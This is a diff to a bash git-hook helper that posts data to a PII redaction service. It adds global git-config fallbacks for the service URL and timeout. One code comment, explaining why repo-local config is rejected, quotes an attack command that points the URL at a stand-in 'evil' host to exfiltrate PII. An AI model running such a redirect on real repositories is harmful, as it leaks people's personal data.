@@ -1,9 +1,22 @@
 #!/usr/bin/env bash
 
 pf_url() {
-  # Empty when no primary is configured (PRIVACY_FILTER_URL unset) — in that
-  # case the hook skips the primary and goes straight to the local fallback.
-  printf '%s' "${PRIVACY_FILTER_URL:-}"
+  # Empty when no primary is configured. Env var wins; otherwise fall back to
+  # GLOBAL git config (privacyfilter.url) so the value reaches git even when
+  # it is launched from a NON-interactive shell (plain SSH / cron / CI) — those
+  # do NOT source ~/.bashrc, so an `export PRIVACY_FILTER_URL=...` there is
+  # invisible and the hook would silently drop to the local fallback. git
+  # config is read on every git invocation, regardless of shell type.
+  #
+  # GLOBAL only (never repo-local .git/config): the URL is where PII is sent,
+  # so a repo must not be able to override it (else an embedded script could
+  # `git config privacyfilter.url http://evil/` and exfiltrate PII). Per-repo
+  # overrides remain possible via the PRIVACY_FILTER_URL env var.
+  if [ -n "${PRIVACY_FILTER_URL:-}" ]; then
+    printf '%s' "${PRIVACY_FILTER_URL}"
+    return
+  fi
+  git config --global --get privacyfilter.url 2>/dev/null || true
 }
 
 pf_skip_active() {
@@ -57,7 +70,9 @@ _pf_post_redact() {
   payload="$1"
   pf_primary_configured || return 1
   url="$(pf_url)/redact"
-  timeout="${PRIVACY_FILTER_TIMEOUT_S:-5}"
+  timeout="${PRIVACY_FILTER_TIMEOUT_S:-}"
+  [ -n "$timeout" ] || timeout="$(git config --global --get privacyfilter.timeout 2>/dev/null || true)"
+  [ -n "$timeout" ] || timeout=5
   response="$(printf '%s' "$payload" | curl -fsS --max-time "$timeout" -X POST \
     -H 'Content-Type: application/json' --data-binary @- \
     --write-out $'\n%{http_code}' "$url" 2>/dev/null)" || return 1
